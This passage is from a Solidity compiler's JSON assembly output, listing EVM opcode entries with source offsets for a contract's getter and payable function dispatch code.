											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "24"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
